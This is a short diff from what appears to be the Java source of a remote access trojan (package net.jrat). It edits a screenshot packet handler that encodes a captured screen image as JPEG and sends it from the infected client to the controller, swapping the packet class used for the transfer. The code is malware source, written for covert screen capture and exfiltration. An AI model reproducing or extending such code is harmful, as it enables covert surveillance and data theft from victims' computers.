@@ -11,7 +11,7 @@ import javax.imageio.ImageIO;
 
 import net.jrat.core.Client;
 import net.jrat.core.packet.IPacket;
-import net.jrat.core.packet.client.C4PacketScreenshot;
+import net.jrat.core.packet.client.C2PacketSaveFile;
 
 public class S8PacketScreenshot implements IPacket
 {
@@ -33,7 +33,7 @@ public class S8PacketScreenshot implements IPacket
 		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
 		ImageIO.write(image, "jpg", outputStream);
 		
-		Client.instance.outputStream.writeObject(new C4PacketScreenshot(outputStream.toByteArray(), this.outputPath));
+		Client.instance.outputStream.writeObject(new C2PacketSaveFile(outputStream.toByteArray(), this.outputPath));
 		outputStream.close();
 	}
 }
